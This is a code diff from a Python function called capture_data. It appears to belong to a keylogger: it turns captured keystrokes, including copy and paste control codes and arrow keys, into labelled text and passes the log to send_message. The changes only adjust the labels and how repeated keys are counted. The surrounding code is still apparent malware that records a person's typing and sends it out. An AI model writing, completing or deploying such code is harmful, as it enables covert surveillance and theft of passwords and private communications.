@@ -336,9 +336,9 @@ def capture_data():
                 elif "ctrl" in s:
                     s=" <"+'Ctrl'+"> "
                 elif '\\x03' in s:
-                    s=' c '
+                    s=' (c) '
                 elif '\\x16' in s:
-                    s=' v '
+                    s=' (v) '
                 elif 'left' in s:
                     s=' <Left> '
                 elif 'right' in s:
@@ -354,13 +354,13 @@ def capture_data():
                     count_key+=1
                 else:
                     if count_key>1:
-                        data=data[:-1]+"("+(str(count_key))+')> '+s
+                        data=data[:-2]+"("+(str(count_key))+')> '+s
                         count_key=0
                     else:
                         data+=s
             
             if count_key>1:
-                data=data[:-1]+"("+(str(count_key))+')> '
+                data=data[:-2]+"("+(str(count_key))+')> '
                 count_key=0
             send_message(data)
             file.close()
